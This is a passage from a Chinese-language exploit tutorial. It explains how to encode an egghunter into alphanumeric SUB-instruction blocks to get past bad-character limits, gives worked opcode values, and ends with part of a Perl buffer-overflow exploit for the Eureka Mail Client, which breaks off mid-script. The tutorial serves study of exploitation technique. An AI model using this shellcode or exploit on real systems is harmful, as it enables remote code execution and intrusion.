2D 35515555 SUB EAX,55555135
50 PUSH EAX
41 INC ECX
41 INC ECX
（上面计算出来的EAX的值对接下来的工作相当重要，一会我们会专门讨论它）
然后EAX的值又被清除（2个与操作），然后又对EAX做了3次SUB操作，最后的结果被压栈。
首先EAX的值是0，执行SUB EAX,55555521后，EAX的值为AAAAAADF；第二个SUB执行后，EAX的值为
555556BE，第三个SUB指令执行后EAX的值为 E7FFE775。然后这个值被放到栈上。
等一下，这个值似曾相识。0xE7, 0xFF, 0xE7, 0x75实际上是采用NtAccessCheckAndAuditAlarm
技术的寻蛋代码的最后资格字节。太神奇了。
继续执行这份代码，将会看到重新生成了原始的寻蛋算法。（不过我用另外一个 Exploit，这段代码没有生成预
期的结果）
Muts用的代码实际上是一个会在栈上重新生成原始的寻蛋算法的编码器，该编码器有效的绕过了 Bad Char的
限制（因为整个编码结果没有使用任何的bad chars）。在这个特殊的Exploit发布之前，我从没见到过类似实现。Muts
太伟大了。
当然，如果AND、PUSH、POP、SUB、INC操作码也在badchar列表中，这种方案也会存在问题。但是你可以通
过巧妙的使用SUB指令来重塑寻蛋代码，并定位出重新制造出来的寻蛋代码的位置，跳转到并执行寻蛋代码。
但是如何实现跳转呢？
如果必须和一个受限制的字符集(例如只包含由字母和数字组成的可打印的Ascii字符)打交道，那么因为jmp esp
或push esp + ret„„等指令包含无效的字符将不能使用。否则简单的把跳转指令放在编码后的寻蛋代码结尾，一切
就OK了。
假定要处理的是受限制的字符集，那么必须找到一个办法来解决这个问题。如果不能实现跳转，那就需要确保
代码能自动执行。最好的方法就是把解码后的寻蛋代码放在解码代码后面„„当解码代码重新生成原始的寻蛋代码
后，寻蛋代码将自动执行。
这就需要在解码代码开始前计算出解码代码后面的第一个地址指针，并把该值赋给 ESP。这样解码工作将重建
寻蛋代码并放置在解码代码后边。接下来的部分我们将探讨如何做到这一点。
如何实现解码代码?
实现解码代码的流程如下：
 设置栈和寄存器的值。（解码后的寻蛋代码大概保存在当前的执行地址 + 解码器代码的长度的位置。而解码后
的寻蛋代码执行时需要的寄存器的值会影响解码代码应该出现的地址。不过如果你能通过jmp esp来跳转到解
码后的寻蛋代码执行，那么ESP在开始解码时是指向当前执行代码的位置你只需要简单的增加ESP的值，使它
指向一个合适的位置就行了)
 每次4字节的在栈上解码代码处生成原始的寻蛋代码（使用2个与运算清空EAX,3个减法运算生成原始的字节，
然后用push指令把刚生成的代码压栈）。
 当所有的指令被重新生成以后，解码后的寻蛋代码就该开始执行了。
首先来对寻蛋代码进行编码。先把代码按4字节进行分组，并从最后一组开始编码。这时因为我们会把解码后
的代码压栈，所以后解码的代码首先执行）。采用NtAccessCheckAndAuditAlarm技术的寻蛋代码占用32字
节，已经是4字节对齐的了,如果没有对齐，可以在代码后面增加一些byte(nops)先完成对齐，然后
在从下网上逐组进行编码。
\x66\x81\xCA\xFF
\x0F\x42\x52\x6A
\x02\x58\xCD\x2E
\x3C\x05\x5A\x74
\xEF\xB8\x77\x30 ;w0
\x30\x74\x8B\xFA ;0t
\xAF\x75\xEA\xAF
\x75\xE7\xFF\xE7
Muts使用的代码会高效的解码出寻蛋代码(这里标记是w00t)。解码代码执行后，被压进栈的内容如下：
Good！
现在还存在两个问题：1.如何跳转到寻蛋代码；2：如何实现给一个寻蛋代码编码。我们看看第二个问题怎么解
决。
这里寻蛋代码由8行4字节的代码组成，那么就需要编码成8块代码。所有编码后的代码仅包含字母和数字组
成的可打印ASCII字符，并且不包含Bad Chars.可打印的Ascii字符指0x20(空格)-0x7E之间的字符。
每一个编码好的块被用来通过SUB指令来解码出原始寻蛋代码的4个字节。下面是计算出sub指令中使用的参
数值的方法：
对一行寻蛋代码，首先翻转4个字节，然后求这个整数值的反码。对上面寻蛋代码的最后一行就是(0x75E7FFE7
-> 0xE7FFE775),反码为0x1800188B.
然后找出3个数的和等于反码（0x1800188B），并且只用到除了\x40\x3f\x3a\x2f这4个字符以外的
ascii-printable字符。
找到的3个值就是可以用在SUB EAX,  指令中的。
因为解码后的值要被压到栈中，所以要从最后一行开始编码。当最后一个值被压进栈后，ESP 就指向解码后的
寻蛋代码的第一个字节。
下面是我用来这处3个这样的值的方法 :
 把反码值的字节翻转
 首先处理第一个字节(在本例中指18).然后找到3个数使它们呢的和为18.因为只能使用ascii-printable
字符，所以有些使用可能需要使和溢出。例如使用3个06(和为18)是不行的，因为06不属于ascii-printable
字符。这是需要和值为溢出的118.第一个数我通常在使用55（55乘以3等于0，这里都是16进制）和7F（最
大的ascii-printable字符）之间的值。例如71. 71 ＋ 71 = E2. 118-E2 = 36.而36属于ascii-printable
字符。这样我们就找到了第一个字节。这可能不是最有效率的方法，不过确实好用。（在window 计算器程序
中，把和值除以3，你就会知道该从那些值开始寻找）。
用同样的方法找到剩余的3个字节。注意，如果在计算某个字节上发生了溢出。你必须对下个字节中计算出的
3个值中的一个减1；试一下你就会明白为什么第3个值的第一个字节是35而不是36.
对上面用到寻蛋代码进行编码的结果的最后一行：
x75 xE7 xFF xE7 -> xE7 xFF xE7 x75: (2’s complement : 0x1800188B)
-----------------------------------------------------------------
sub eax, 0x71557130 (=> "\x2d\x30\x71\x55\x71") (Reverse again !)
sub eax, 0x71557130 (=> "\x2d\x30\x71\x55\x71")
sub eax, 0x3555362B (=> "\x2d\x2B\x36\x55\x35")
=> sum of these 3 values is 0x11800188B (or 0x1800188B in dword)
倒数第二行：
xAF x75 xEA xAF -> xAF xEA x75 xAF: (2’s complement : 0x50158A51)
-----------------------------------------------------------------
sub eax, 0x71713071
sub eax, 0x71713071
sub eax, 0x6D33296F
剩下的
x30 x74 x8B xFA -> xFA x8B x74 x30: (2’s complement : 0x05748BD0)
-----------------------------------------------------------------
sub eax, 0x65253050
sub eax, 0x65253050
sub eax, 0x3B2A2B30
xEF xB8 x77 x30 -> x30 x77 xB8 xEF: (2’s complement : 0xCF884711)
-----------------------------------------------------------------
sub eax, 0x41307171
sub eax, 0x41307171
sub eax, 0x4D27642F
x3C x05 x5A x74 -> x74 x5A x05 x3C: (2’s complement : 0x8BA5FAC4)
------------------------------------------------------------------
sub eax, 0x30305342
sub eax, 0x30305341
sub eax, 0x2B455441
x02 x58 xCD x2E -> x2E xCD x58 x02: (2’s complement : 0xD132A7FE)
-----------------------------------------------------------------
sub eax, 0x46663054
sub eax, 0x46663055
sub eax, 0x44664755
x0F x42 x52 x6A -> x6A x52 x42 x0F: (2’s complement : 0x95ADBDF1)
-----------------------------------------------------------------
sub eax, 0x31393E50
sub eax, 0X32393E50
sub eax, 0x323B4151
最后，也就是第一行
66 x81 xca xff -> xff xca x81 x66 (2’s complement : 0x00357E9A)
----------------------------------------------------------------
sub eax, 0x55703533
sub eax, 0x55702533
sub eax, 0x55552434
这些代码(SUB指令)块前面都必须放置把EAX清0的代码。例如：
AND EAX,554E4D4A ("\x25\x4A\x4D\x4E\x55")
AND EAX,2A313235 ("\x25\x35\x32\x31\x2A")
（两个5字节的指令）
并且每块后面还必须增加Push EAX指令(“\x50”占一个字节)，这会把结果压栈。如果忘了这一点，寻蛋代
码将不会被放到栈上。
所以：每个块大小为10(eax清0) + 15(用于解码) + 1(push eax) ＝ 26字节，8个块空占用208个字节。
注意：把sub eax, 指令翻译成操作码(opcode)是,别忘了对值做字节翻转操作。所以sub eax,0×476D556F
的字节码是“\x2d\x6f\x55\x6d\x47”。
下一步，我们就要确保寻蛋代码被解码后能被执行。
为了实现这一步，需要把寻蛋代码解码到一个可预测的位置然后跳转执行寻蛋代码。或者把解码后的寻蛋代码
直接解码到解码代码的后面，从而让寻蛋代码自动执行。
如果可以把寻蛋代码解码到一个可预测的位置（通过在解码前修改 ESP 的值），并且在解码完成后跳转到寻蛋
代码开始处执行，那么一切OK。
当然如果受到字符集的限制，很可能没法把”jmp esp” 或着 “push esp/ret”或类似的指令附加到解码代码后面。
当然如果可以，那将无疑是一个好消息。
如果不能实现跳转，那就需要把解码后的寻蛋代码放置在解码代码的后面。这样解码代码完成后，寻蛋代码就
开始执行。这需要我们计算处应该把解码后的代码放置的位置。所以在解码过程开始时，就应该根据已知的解码代
码的字节数来修改ESP的值。这样解码后的寻蛋代码就恰好出现在解码代码的后面。
修改ESP值的技术也受到可用的字符的影响。如果只能使用ascii-printable字符，那就意味着不能使用add、
sub和mov指令等。一个可行的方法是使用连续的POPAD指令来修改ESP的值，从而使ESP指向解码代码后面的值。
谨慎一点，可以在解码代码后面增加一些NOP操作。（对于只能使用ascii-printable 字符的环境下0x41可以
达到和NOP一样好的效果）。
所有的问题都解决了,我们最后得到的代码看起来像下面这个样子：
修改ESP的代码（POPAD） + 解码代码(包含8个小块：eax清0，解码，压栈) + 一些NOPS(根据需要)
在Eureka Mail Client exploit使用这项技术后.我们得到下面的战利品。
use Socket;
#fill out the local IP or hostname
#which is used by Eureka EMail as POP3 server
#note : must be exact match !
my $localserver = "192.168.0.193";
#calculate offset to EIP
my $junk = "A" x (723 - length($localserver));
my $ret=pack('V',0x7E47BCAF); #jmp esp from user32.dll
my $padding = "\x90" x 1000;
#alphanumeric ascii-printable encoded + bad chars
# tag = w00t
my $egghunter =
#popad - make ESP point below the encoded hunter
"\x61\x61\x61\x61\x61\x61\x61\x61".
#-----8 blocks encoded hunter---------------
"\x25\x4A\x4D\x4E\x55". #zero eax
"\x25\x35\x32\x31\x2A". #
"\x2d\x30\x71\x55\x71". #x75 xE7 xFF xE7
"\x2d\x30\x71\x55\x71".
"\x2d\x2B\x36\x55\x35".
"\x50". #push eax
#--------------------------
"\x25\x4A\x4D\x4E\x55". #zero eax
"\x25\x35\x32\x31\x2A". #
"\x2d\x71\x30\x71\x71". #xAF x75 xEA xAF
"\x2d\x71\x30\x71\x71".
"\x2d\x6F\x29\x33\x6D".
"\x50". #push eax
#--------------------------
"\x25\x4A\x4D\x4E\x55". #zero eax
"\x25\x35\x32\x31\x2A". #
"\x2d\x50\x30\x25\x65". #x30 x74 x8B xFA
"\x2d\x50\x30\x25\x65".
"\x2d\x30\x2B\x2A\x3B".
"\x50". #push eax
#---------------------------
"\x25\x4A\x4D\x4E\x55". #zero eax
"\x25\x35\x32\x31\x2A". #
"\x2d\x71\x71\x30\x41". #xEF xB8 x77 x30
"\x2d\x71\x71\x30\x41".
"\x2d\x2F\x64\x27\x4d".
"\x50". #push eax
#---------------------------
"\x25\x4A\x4D\x4E\x55". #zero eax
"\x25\x35\x32\x31\x2A". #
"\x2d\x42\x53\x30\x30". #x3C x05 x5A x74
"\x2d\x41\x53\x30\x30".
"\x2d\x41\x54\x45\x2B".
"\x50". #push eax
#---------------------------
"\x25\x4A\x4D\x4E\x55". #zero eax
"\x25\x35\x32\x31\x2A". #
"\x2d\x54\x30\x66\x46". #x02 x58 xCD x2E